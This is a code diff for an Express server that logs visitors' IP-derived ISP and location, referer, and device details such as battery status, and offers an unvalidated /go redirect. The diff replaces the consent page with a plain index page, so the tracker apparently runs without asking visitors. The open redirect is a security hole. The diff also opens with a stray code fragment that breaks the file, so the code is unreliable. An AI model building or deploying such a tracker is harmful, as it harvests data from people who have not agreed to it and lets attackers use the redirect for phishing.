@@ -1,3 +1,6 @@
+/localhost:${PORT}`);
+});
+         
 const express = require('express');
 const fs = require('fs');
 const path = require('path');
@@ -10,7 +13,7 @@ app.use(express.urlencoded({ extended: true }));
 app.use(express.static('views'));
 
 app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'views', 'consent.html'));
+    res.sendFile(path.join(__dirname, 'views', 'index.html'));
 });
 
 app.post('/log', async (req, res) => {
@@ -19,7 +22,7 @@ app.post('/log', async (req, res) => {
     const ref = req.headers['referer'] || 'Direct';
     const clientData = req.body || {};
 
-    // Get ISP & location using ip-api
+    // Get ISP & location
     let ispInfo = 'Unknown ISP';
     let city = 'Unknown City';
     let country = 'Unknown Country';
@@ -48,19 +51,20 @@ Charging: ${clientData.battery?.charging}
 ---------------------------
 `;
 
-    fs.appendFileSync(path.join(__dirname, 'logs', 'visits.log'), log);
+    // ✅ Log to Render dashboard
+    console.log(log);
     res.json({ status: 'logged' });
 });
 
 app.get('/go', (req, res) => {
     const target = req.query.url;
     if (!target || !target.startsWith('http')) {
-        return res.status(400).send('Invalid or missing redirect URL.');
+        return res.status(400).send('Invalid URL');
     }
     return res.redirect(target);
 });
 
 app.listen(PORT, () => {
-    console.log(`Server running on http://localhost:${PORT}`);
+    console.log(`✅ Server running on http://localhost:${PORT}`);
 });
-         
+        
